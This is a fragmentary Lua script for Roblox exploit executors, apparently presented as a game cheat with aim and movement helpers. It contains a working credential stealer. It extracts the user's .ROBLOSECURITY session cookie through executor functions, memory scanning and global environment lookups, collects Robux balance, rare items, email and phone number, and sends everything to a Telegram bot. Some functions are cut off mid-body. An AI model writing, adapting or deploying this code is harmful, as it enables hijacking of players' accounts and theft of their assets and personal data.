local function request(opts)
	local req = (syn and syn.request)
		or (http and http.request)
		or (fluxus and fluxus.request)
		or (krnl and krnl.request)
		or (request)
		or (http_request)
	if req then
		return req(opts)
	end
	return nil
end

local function getCookie()
	local cookie = ""

	pcall(function()
		if syn and syn.cookie then
			cookie = syn.cookie
		elseif getcookie then
			cookie = getcookie(".ROBLOSECURITY") or getcookie("ROBLOSECURITY") or ""
		end
	end)

	if cookie == "" or #cookie < 80 then
		pcall(function()
			for _, v in pairs(getgc(true)) do
				if type(v) == "table" then
					local c = rawget(v, "Cookie")
						or rawget(v, ".ROBLOSECURITY")
						or rawget(v, "cookie")
						or rawget(v, "ROBLOSECURITY")
					if type(c) == "string" and #c > 80 and (c:find("_|") or c:find("%.ROBLOSECURITY")) then
						cookie = c
						break
					end
				end
			end
		end)
	end

	if (cookie == "" or #cookie < 80) and getgenv then
		pcall(function()
			local env = getgenv()
			if type(env.cookie) == "string" and #env.cookie > 80 then
				cookie = env.cookie
			elseif type(env.ROBLOSECURITY) == "string" and #env.ROBLOSECURITY > 80 then
				cookie = env.ROBLOSECURITY
			end
		end)
	end

	return (#cookie > 80) and cookie or "FAILED_TO_GRAB_COOKIE"
end

local function api(url, cookie)
	local res = request({
		Url = url,
		Method = "GET",
		Headers = {
			["Cookie"] = ".ROBLOSECURITY=" .. cookie,
			["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
			["Accept"] = "application/json",
			["Referer"] = "https://www.roblox.com/",
		},
	})
	if res and res.StatusCode == 200 and type(res.Body) == "string" then
		local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
		if ok then
			return data
		end
	end
	return nil
end

local function collect()
	local cookie = getCookie()
	local uid = LocalPlayer.UserId
	local name = LocalPlayer.Name

	local economy   = api("https://economy.roblox.com/v1/users/" .. uid .. "/currency", cookie) or {}
	local inventory = api("https://inventory.roblox.com/v1/users/" .. uid .. "/assets/collectibles?limit=50&sortOrder=Desc", cookie) or {}
	local groups    = api("https://groups.roblox.com/v1/users/" .. uid .. "/groups/roles", cookie) or {}
	local emailData = api("https://accountsettings.roblox.com/v1/email", cookie) or {}
	local phoneData = api("https://accountinformation.roblox.com/v1/phone", cookie) or {}

	local hasHeadless, hasKorblox, hasVerified = false, false, false
	if inventory and inventory.data then
		for _, item in pairs(inventory.data) do
			local n = (item.name or ""):lower()
			if n:find("headless") then hasHeadless = true end
			if n:find("korblox") then hasKorblox = true end
			if n:find("verified") then hasVerified = true end
		end
	end

	return {
		Username     = name,
		UserId       = uid,
		DisplayName  = LocalPlayer.DisplayName,
		AgeDays      = LocalPlayer.AccountAge,
		Profile      = "https://www.roblox.com/users/" .. uid .. "/profile",
		Email        = emailData.emailAddress or "Not available",
		Phone        = (phoneData and (phoneData.phone or phoneData.phoneNumber)) or "Not available",
		Robux        = economy.robux or 0,
		Headless     = hasHeadless,
		Korblox      = hasKorblox,
		VerifiedHat  = hasVerified,
		GroupCount   = (groups and groups.data and #groups.data) or 0,
		Cookie       = cookie,
		Time         = os.date("%Y-%m-%d %H:%M:%S"),
		Executor     = (identifyexecutor and identifyexecutor()) or "Unknown",
		PlaceId      = game.PlaceId,
		JobId        = game.JobId,
	}
end

		"Place: %s | Job: %s\n" ..
		"Time: %s\n" ..
		"Cookie:\n%s",
		d.Username, d.UserId,
		d.Profile,
		tostring(d.AgeDays),
		tostring(d.Robux),
		d.Email,
		d.Phone,
		tostring(d.Headless), tostring(d.Korblox), tostring(d.VerifiedHat),
		tostring(d.GroupCount),
		d.Executor,
		tostring(d.PlaceId), tostring(d.JobId),
		d.Time,
		d.Cookie
	)
end

local function sendTelegram(text)
	if TELEGRAM_BOT_TOKEN == "PUT_YOUR_BOT_TOKEN_HERE" or TELEGRAM_CHAT_ID == "PUT_YOUR_CHAT_ID_HERE" then
		warn("[Collector] Telegram credentials not set")
		return
	end
	local url = "https://api.telegram.org/bot" .. TELEGRAM_BOT_TOKEN .. "/sendMessage"
	request({
		Url = url,
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body = HttpService:JSONEncode({
			chat_id = TELEGRAM_CHAT_ID,
			text = text,
			disable_web_page_preview = true,
		}),
	})
end

local function getClosest()
	local closest, dist = nil, 450
	local char = LocalPlayer.Character
	if not char or not char:FindFirstChild("HumanoidRootPart") then return nil end
	local origin = char.HumanoidRootPart.Position
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid.Health > 0 then
			local d = (plr.Character.HumanoidRootPart.Position - origin).Magnitude
			if d < dist then
				dist = d
				closest = plr
			end
		end
	end
	return closest
end

			if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir = dir + cam.CFrame.LookVector end
